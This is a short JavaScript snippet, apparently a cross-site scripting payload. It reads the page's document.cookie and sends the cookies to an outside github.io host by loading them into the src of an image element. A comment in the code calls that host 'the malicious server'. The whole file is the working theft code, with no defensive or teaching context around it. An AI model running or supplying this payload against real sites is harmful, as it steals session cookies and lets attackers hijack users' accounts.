// Get the cookies
var cookies = document.cookie;

// Create a new image element to send the cookies to the malicious server
var img = new Image();
img.src = "https://YasinElfek.github.io/exploaition.com/." + encodeURIComponent(cookies);

// Add the image element to the page (not necessary, but can be used to verify the request)
document.body.appendChild(img);
